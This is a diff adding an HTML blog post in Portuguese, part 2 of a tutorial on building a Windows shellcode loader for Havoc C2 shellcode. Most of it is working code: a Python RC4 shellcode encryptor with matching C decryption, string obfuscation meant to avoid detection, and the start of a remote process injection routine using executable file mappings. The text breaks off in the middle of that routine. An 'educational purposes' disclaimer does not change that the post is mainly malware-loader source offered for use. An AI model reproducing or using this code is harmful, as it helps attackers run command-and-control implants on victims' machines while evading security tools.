@@ -1,0 +1,1276 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="../images/50.png" type="image/x-icon">
+    <title>Simple-Loader</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/languages/cpp.min.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            document.querySelectorAll('pre code').forEach((block) => {
+                hljs.highlightElement(block);
+            });
+        });
+    </script>
+    <style>
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #333;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #555;
+            border-radius: 5px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #777;
+        }
+
+        html {
+            scrollbar-color: #555 #333;
+            scrollbar-width: thin;
+        }
+    </style>
+    <style>
+        pre {
+            background-color: #1e1e1e;
+            color: #ffffff;
+            padding: 15px;
+            border-radius: 8px;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+    </style>
+    <link rel="stylesheet" href="../style.css">
+    <link rel="stylesheet" href="../text_style.css">
+    <link rel="stylesheet" href="../dimensao.css">
+    <link rel="stylesheet" href="../background.css">
+    <link rel="stylesheet" href="../head_style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    <header style="height: 55px;">
+        <div class="logo">
+            <img src="../images/50.png" height="40" alt="Vith0r logo"
+                style="position: relative; left: none; height: 42px; width: 42px; top: -1px;">
+            <h2>
+                <a href="https://vith0r.github.io"
+                    style="color: rgba(255, 255, 255, 0.7); text-decoration: none; position: relative; text-shadow: 3px 3px 5px rgba(139, 92, 246, 0.7); font-family: 'Press Start 2P', sans-serif; font-size: 19px;">
+                    &nbsp;VITHOR
+                </a>
+            </h2>
+        </div>
+        <nav>
+            <div class="toggle-container">
+                <a href="../whoami.html">
+                    <button class="tutorials-toggle"><i></i>Whoami</button>
+                </a>
+                <a href="../posts.html">
+                    <button class="tools-toggle"><i></i>Posts</button>
+                </a>
+                <a href="../projects.html">
+                    <button class="tools-toggle"><i></i>Projects</button>
+                </a>
+            </div>
+        </nav>
+    </header>
+    <script>
+        const element = document.querySelector('.logo h2 a');
+        const targetWord = "VITHOR";
+
+        function getRandomString(length) {
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return result;
+        }
+
+        function animateRandomization(element, targetWord) {
+            const originalWord = targetWord.split('');
+            let iterations = 0;
+            const maxIterations = 15;
+            let currentWord = getRandomString(targetWord.length).split('');
+            let currentIndex = 0;
+
+            element.style.display = 'inline-block';
+            element.style.width = `${element.offsetWidth}px`;
+            element.style.position = 'relative';
+            element.style.left = '5px';
+
+            const interval = setInterval(() => {
+                if (iterations < maxIterations) {
+                    currentWord = getRandomString(targetWord.length).split('');
+                    iterations++;
+                } else {
+                    if (currentIndex < targetWord.length) {
+                        currentWord[currentIndex] = originalWord[currentIndex];
+                        currentIndex++;
+                    } else {
+                        clearInterval(interval);
+                    }
+                }
+                element.textContent = currentWord.join('');
+            }, 60);
+        }
+
+        setInterval(() => {
+            animateRandomization(element, targetWord);
+        }, 10000);
+
+        element.addEventListener('mouseover', () => {
+            animateRandomization(element, targetWord);
+        });
+
+        animateRandomization(element, targetWord);
+    </script>
+
+    <body>
+        <div class="grain-header"></div>
+        <main>
+            <div class="box">
+                <h1
+                    style="color: rgba(255, 255, 255, 0.9); text-decoration: none; position: relative; text-shadow: 3px 3px 5px rgba(60, 122, 255, 0.8);">
+                    Criando Um Carregador Simples Part-2</h1>
+                <br>
+                <p>Posted Jul 22, 2024. 30 min read</p>
+                <br>
+                <div class="post-author">
+                    <a href="https://github.com/Vith0r" target="_blank">
+                        <img src="https://avatars.githubusercontent.com/u/124220594?v=4" alt="Vithor logo">
+                        <span>Vithor</span>
+                    </a>
+                </div>
+
+                <article>
+                    <div style="font-size: 16px;">
+                        <p>Bom nesse post vamos melhorar e aprimorar nosso shellcode loader, já que vimos no post
+                            passado que esse nosso código está muito simples.</p>
+                        <br>
+                        <div
+                            style="padding: 10px; background-color: rgba(60, 122, 255, 0.2); color: white; margin-bottom: 10px;">
+                            ⚠️ As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou
+                            qualquer outra coisa são estritamente para fins educacionais.
+                        </div>
+                        <br>
+                        <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">
+                            Começo</h2>
+                        <p>Bom como falei nesse post vamos estar utilizando o <a href="https://havocframework.com/"
+                                href="https://havocframework.com/" style="color: #9E2525;">havoc-framework</a>, então
+                            vamos gerar uma shellcode no havoc, e na parte de configuração da carga util vamos
+                            selecionar algumas coisas como:<br>Habilitar <span style="color: #9E2525;">Inderect
+                                Syscall</span>.<br>Selecionar em Sleep technique <span
+                                style="color: #9E2525;">Ekko</span>.<br>De resto não precisamos mudar mais nada, apenas
+                            vamos gerar nossa shellcode.</p>
+                        <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">
+                            Ofucação de Shellcode</h2>
+                        <p>Existem vários projetos para ofuscar nossa shellcode, como <span
+                                style="color: #9E2525;">AES</span>, <span style="color: #9E2525;">XOR</span>, <span
+                                style="color: #9E2525;">IPv4</span>, <span style="color: #9E2525;">MAC</span>, dentre
+                            várias outras. Mas vou usar a boa e velha ofuscação <span
+                                style="color: #9E2525;">RC4</span>.<br><br>Vou fornecer abaixo um código em Python que
+                            vai tanto ofuscar sua shellcode quanto fornecer o código necessário para conseguir
+                            descriptografar a shellcode.<br><br><span style="color: #9E2525;">Uso: python rc4.py
+                                <binario> > salvo.txt
+                            </span></p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> random
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_encrypt</span>(<span class="hljs-params">data, key</span>):
+    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))
+    j = <span class="hljs-number">0</span>
+    out = []
+
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
+        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span>
+        S[i], S[j] = S[j], S[i]
+
+    i = j = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:
+        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>
+        j = (j + S[i]) % <span class="hljs-number">256</span>
+        S[i], S[j] = S[j], S[i]
+        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])
+
+    <span class="hljs-keyword">return</span> out
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_random_key</span>(<span class="hljs-params">length</span>):
+    <span class="hljs-keyword">return</span> [random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length)]
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Uso: python rc4.py &lt;binario&gt;&quot;</span>)
+        sys.exit(<span class="hljs-number">1</span>)
+
+    input_file = sys.argv[<span class="hljs-number">1</span>]
+
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:
+            data = f.read()
+    <span class="hljs-keyword">except</span> FileNotFoundError:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;File &#x27;<span class="hljs-subst">{input_file}</span>&#x27; not found.&quot;</span>)
+        sys.exit(<span class="hljs-number">1</span>)
+
+    random_key = generate_random_key(<span class="hljs-number">16</span>)
+    encrypted_data = rc4_encrypt(data, random_key)
+
+    <span class="hljs-comment"># Calculating the size of the encrypted payload</span>
+    encrypted_payload_size = <span class="hljs-built_in">len</span>(encrypted_data)
+
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;unsigned char payload[] = {&quot;</span>)
+    <span class="hljs-keyword">for</span> i, byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(encrypted_data):
+        <span class="hljs-keyword">if</span> i % <span class="hljs-number">16</span> == <span class="hljs-number">0</span>:
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\t&quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;0x<span class="hljs-subst">{byte:02X}</span>, &quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)
+        <span class="hljs-keyword">if</span> (i + <span class="hljs-number">1</span>) % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>:
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n};&quot;</span>)
+
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nunsigned char chaveRC4[] = {&quot;</span>)
+    <span class="hljs-keyword">for</span> i, byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(random_key):
+        <span class="hljs-keyword">if</span> i % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>:
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\t&quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;0x<span class="hljs-subst">{byte:02X}</span>, &quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)
+        <span class="hljs-keyword">if</span> (i + <span class="hljs-number">1</span>) % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>:
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;};&quot;</span>)
+
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nEncrypted payload size: <span class="hljs-subst">{encrypted_payload_size}</span> bytes&quot;</span>)
+
+
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;&quot;
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+ &quot;&quot;&quot;</span>)
+
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;&quot;
+typedef struct _USTRING {
+    ULONG Length;
+    ULONG MaximumLength;
+    PWSTR Buffer;
+} USTRING;
+
+typedef LONG NTSTATUS;
+
+typedef NTSTATUS(NTAPI* fnSystemFunction032)(
+    USTRING* Img,
+    USTRING* Key
+    );
+
+BOOL RC4DEC(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
+    NTSTATUS STATUS;
+    USTRING Key = { dwRc4KeySize, dwRc4KeySize, reinterpret_cast&lt;PWSTR&gt;(pRc4Key) };
+    USTRING Img = { sPayloadSize, sPayloadSize, reinterpret_cast&lt;PWSTR&gt;(pPayloadData) };
+	  char a_dll_name[] = { &#x27;A&#x27;,&#x27;d&#x27;,&#x27;v&#x27;,&#x27;a&#x27;,&#x27;p&#x27;,&#x27;i&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,0 };
+	  char NotSysFunc32[] = { &#x27;S&#x27;,&#x27;y&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;e&#x27;,&#x27;m&#x27;,&#x27;F&#x27;,&#x27;u&#x27;,&#x27;n&#x27;,&#x27;c&#x27;,&#x27;t&#x27;,&#x27;i&#x27;,&#x27;o&#x27;,&#x27;n&#x27;,&#x27;0&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,0 };
+    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA(a_dll_name), NotSysFunc32);
+
+    STATUS = SystemFunction032(&amp;Img, &amp;Key);
+    if (STATUS != 0x0) {
+        return FALSE;
+    }
+    return TRUE;
+}
+ &quot;&quot;&quot;</span>)
+    
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;&quot;
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+ &quot;&quot;&quot;</span>)
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
+    main()
+</pre>
+                        <br>
+                        <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">
+                            Código</h2>
+                        <p>Nosso código vai começar definindo algumas estruturas como <span
+                                style="color: #9E2525;">CLIENT_ID</span>, <span
+                                style="color: #9E2525;">UNICODE_STRING</span>, <span
+                                style="color: #9E2525;">OBJECT_ATTRIBUTES</span>, que vão ser necessárias devido ao uso
+                            que vamos fazer de <span style="color: #9E2525;">NtOpenProcess</span>.<br><br><span
+                                style="color: #9E2525;">CLIENT_ID</span>: Essa estrutura armazena identificadores únicos
+                            para um processo e uma thread. O uso dessas identificações é crucial para que o sistema
+                            saiba a qual processo ou thread estamos nos referindo, permitindo manipulações precisas.</p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_CLIENT_ID</span> {
+    HANDLE UniqueProcess; <span class="hljs-comment">// Identificador do processo</span>
+    HANDLE UniqueThread;  <span class="hljs-comment">// Identificador da thread</span>
+} CLIENT_ID, * PCLIENT_ID;
+
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">UNICODE_STRING</span>: Usada para representar strings que
+                            suportam caracteres Unicode. Isso é importante em sistemas que precisam manipular diferentes
+                            conjuntos de caracteres, permitindo que o programa seja mais flexível e compatível com
+                            diversas linguagens:</p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_UNICODE_STRING</span> {
+    USHORT Length;          <span class="hljs-comment">// Comprimento da string</span>
+    USHORT MaximumLength;   <span class="hljs-comment">// Comprimento máximo da string</span>
+    PWSTR  Buffer;          <span class="hljs-comment">// Ponteiro para os caracteres</span>
+} UNICODE_STRING, * PUNICODE_STRING;
+
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">OBJECT_ATTRIBUTES</span>: Contém informações sobre objetos do
+                            Windows, como processos e threads. Essa estrutura é fundamental ao abrir processos, pois
+                            permite definir atributos como segurança e nome do objeto:</p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_OBJECT_ATTRIBUTES</span> {
+    ULONG           Length;             <span class="hljs-comment">// Comprimento da estrutura</span>
+    HANDLE          RootDirectory;      <span class="hljs-comment">// Diretório raiz (pode ser NULL)</span>
+    PUNICODE_STRING ObjectName;         <span class="hljs-comment">// Nome do objeto (pode ser NULL)</span>
+    ULONG           Attributes;         <span class="hljs-comment">// Atributos do objeto</span>
+    PVOID           SecurityDescriptor;  <span class="hljs-comment">// Descritor de segurança (pode ser NULL)</span>
+    PVOID           SecurityQualityOfService; <span class="hljs-comment">// Qualidade de serviço (pode ser NULL)</span>
+} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+</pre>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* NtOpenProcess_t)</span><span class="hljs-params">(
+    PHANDLE ProcessHandle,
+    ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PCLIENT_ID ClientId
+)</span></span>;
+</pre>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HANDLE</span><span class="hljs-params">(WINAPI* FuncaoThread)</span><span class="hljs-params">(
+    HANDLE,
+    LPSECURITY_ATTRIBUTES,
+    SIZE_T,
+    LPTHREAD_START_ROUTINE,
+    LPVOID,
+    DWORD,
+    LPDWORD
+)</span></span>;
+
+FuncaoThread CriarThreadRemota;
+</pre>
+                        <br>
+                        <p>Vamos utilizar uma técnica importante que é a ofuscação de strings:</p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-type">char</span> dllKernel[] = { <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-number">0</span> };
+</pre>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-type">char</span> nomeFuncaoThread[] = { <span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-number">0</span> };
+</pre>
+                        <br>
+                        <p>Esse método oculta o nome da DLL <span style="color: #9E2525;">kernel32.dll</span> e o nome
+                            da função <span style="color: #9E2525;">CreateRemoteThread</span> de uma forma que dificulta
+                            a leitura direta do código. isso pode ajudar a evitar detecções por ferramentas
+                            automatizadas que buscam por strings conhecidas.</p>
+                        <p>Função <span style="color: #9E2525;">GetNtFunction</span>:<br>Esta nossa função carrega
+                            funções da biblioteca <span style="color: #9E2525;">ntdll.dll</span>, que contém APIs
+                            nativas do Windows:</p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;
+T <span class="hljs-title">GetNtFunction</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* funcName)</span> </span>{
+    HMODULE ntdll = <span class="hljs-built_in">GetModuleHandleW</span>(<span class="hljs-string">L&quot;ntdll.dll&quot;</span>);
+    <span class="hljs-keyword">if</span> (!ntdll) {
+        <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+        std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Falha ao obter identificador para ntdll.dll&quot;</span> &lt;&lt; std::endl;
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>; <span class="hljs-comment">// Tratamento de erro se a DLL não for encontrada</span>
+    }
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">reinterpret_cast</span>&lt;T&gt;(<span class="hljs-built_in">GetProcAddress</span>(ntdll, funcName));
+}
+</pre>
+                        <br>
+                        <p>Vamos, obviamente, fornecer a parte do código responsável por descriptografar nossa
+                            shellcode:<br></p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_USTRING</span> {
+	ULONG Length;
+	ULONG MaximumLength;
+	PWSTR Buffer;
+} USTRING;
+
+<span class="hljs-keyword">typedef</span> LONG NTSTATUS;
+
+<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* fnSystemFunction032)</span><span class="hljs-params">(
+	USTRING* Img,
+	USTRING* Key
+	)</span></span>;
+
+<span class="hljs-function">BOOL <span class="hljs-title">RC4DEC</span><span class="hljs-params">(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize)</span> </span>{
+	NTSTATUS STATUS;
+	USTRING Key = { dwRc4KeySize, dwRc4KeySize, <span class="hljs-built_in">reinterpret_cast</span>&lt;PWSTR&gt;(pRc4Key) };
+	USTRING Img = { sPayloadSize, sPayloadSize, <span class="hljs-built_in">reinterpret_cast</span>&lt;PWSTR&gt;(pPayloadData) };
+	<span class="hljs-type">char</span> a_dll_name[] = { <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-number">0</span> };
+	<span class="hljs-type">char</span> NotSysFunc32[] = { <span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-number">0</span> };
+	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)<span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">LoadLibraryA</span>(a_dll_name), NotSysFunc32);
+
+	STATUS = <span class="hljs-built_in">SystemFunction032</span>(&amp;Img, &amp;Key);
+	<span class="hljs-keyword">if</span> (STATUS != <span class="hljs-number">0x0</span>) {
+		<span class="hljs-keyword">return</span> FALSE;
+	}
+	<span class="hljs-keyword">return</span> TRUE;
+}
+</pre>
+                        <br>
+                        <p>Nossa função <span style="color: #9E2525;">InjetarPayload</span> vai ser responsável por
+                            mapear a memória do processo alvo e injetar o payload.</p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-function">BOOL <span class="hljs-title">InjetarPayload</span><span class="hljs-params">(IN HANDLE handleProcesso, IN PBYTE payload, IN SIZE_T tamanhoPayload, OUT PVOID* enderecoRemoto)</span></span>;
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">handleProcesso</span>: Esse parâmetro representa um
+                            identificador (handle) para o processo remoto no qual eu pretendo injetar o payload. Eu
+                            passo esse identificador como argumento para que a função saiba em qual processo realizar o
+                            mapeamento de memória.<br><span style="color: #9E2525;">payload</span>: Esse é um ponteiro
+                            para o buffer que contém o payload.<br><span style="color: #9E2525;">tamanhoPayload</span>:
+                            Como o nome indica, esse parâmetro contém o tamanho, em bytes, do payload. Ele é fundamental
+                            para garantir que a função saiba o quanto de memória precisa reservar e transferir para o
+                            processo remoto.<br><span style="color: #9E2525;">enderecoRemoto</span>: Esse é um ponteiro
+                            de saída que, após a execução da função, irá conter o endereço remoto onde o payload foi
+                            mapeado no processo alvo.</p>
+                        <p>Agora, vou detalhar as variáveis que eu utilizo ao longo da função:</p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">BOOL estado = TRUE;
+HANDLE handleMapeamentoArquivo = <span class="hljs-literal">NULL</span>;
+PVOID enderecoLocal = <span class="hljs-literal">NULL</span>, enderecoMapeamentoRemoto = <span class="hljs-literal">NULL</span>;
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">estado</span>: Eu inicializo essa variável como TRUE para
+                            indicar que o processo está ocorrendo de forma correta até aquele ponto. Ao longo da
+                            execução, vou alterando esse valor para FALSE caso algum erro aconteça, o que me permite
+                            saber se tudo correu como esperado.<br><span
+                                style="color: #9E2525;">handleMapeamentoArquivo</span>: Esta variável armazena o
+                            identificador do objeto de mapeamento de arquivo que eu crio na memória. Esse handle é
+                            crucial para que eu possa compartilhar o espaço de memória entre o meu processo e o processo
+                            remoto.<br><span style="color: #9E2525;">enderecoLocal</span>: Esta variável contém o
+                            endereço local onde o payload será copiado inicialmente, ou seja, no meu processo.<br><span
+                                style="color: #9E2525;">enderecoMapeamentoRemoto</span>: Por fim, essa variável
+                            armazenará o endereço no processo remoto onde o payload foi injetado, após o mapeamento ser
+                            realizado com sucesso.</p>
+                        <p>Agora, vou explicar detalhadamente o fluxo de execução do código.</p>
+                        <p><strong>Criação do Mapeamento de Arquivo:</strong><br><br>O primeiro passo é criar um objeto
+                            de mapeamento de arquivo na memória:</p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">handleMapeamentoArquivo = <span class="hljs-built_in">CreateFileMapping</span>(INVALID_HANDLE_VALUE, <span class="hljs-literal">NULL</span>, PAGE_EXECUTE_READWRITE, <span class="hljs-literal">NULL</span>, (DWORD)tamanhoPayload, <span class="hljs-literal">NULL</span>);
+<span class="hljs-keyword">if</span> (handleMapeamentoArquivo == <span class="hljs-literal">NULL</span>) {
+    <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+    std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Erro ao criar o mapeamento de arquivo.&quot;</span> &lt;&lt; std::endl;
+    estado = FALSE;
+    <span class="hljs-keyword">goto</span> FimDaFuncao;
+}
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">CreateFileMapping</span>: Essa função cria um objeto de
+                            mapeamento de arquivo, mas aqui estou usando <span
+                                style="color: #9E2525;">INVALID_HANDLE_VALUE</span> como primeiro argumento, o que
+                            significa que o mapeamento será feito diretamente na memória, sem que haja um arquivo físico
+                            envolvido. Isso é útil para criar um espaço de memória compartilhado entre o meu processo e
+                            o processo remoto, sem a necessidade de usar arquivos intermediários.<br><br><span
+                                style="color: #9E2525;">PAGE_EXECUTE_READWRITE</span>: Aqui, defino as permissões do
+                            mapeamento. Eu escolhi usar <span style="color: #9E2525;">PAGE_EXECUTE_READWRITE</span> para
+                            garantir que a memória possa ser lida, escrita e executada tanto no processo local quanto no
+                            remoto. Essa escolha pode ter implicações de segurança, já que conceder permissões de
+                            execução para um espaço de memória compartilhado pode ser um risco, mas para o propósito
+                            deste código, é necessário.</p>
+                        <p>Caso a criação do mapeamento de arquivo falhe, defino o estado como <span
+                                style="color: #9E2525;">FALSE</span> e exibo uma mensagem de erro. A função termina
+                            neste ponto, caso haja uma falha.</p>
+                        <p><strong>Mapeamento Local da Memória</strong><br><br>Depois que o objeto de mapeamento é
+                            criado com sucesso, o próximo passo é mapear essa memória para o meu processo:<br></p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">enderecoLocal = <span class="hljs-built_in">MapViewOfFile</span>(handleMapeamentoArquivo, FILE_MAP_WRITE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, tamanhoPayload);
+<span class="hljs-keyword">if</span> (enderecoLocal == <span class="hljs-literal">NULL</span>) {
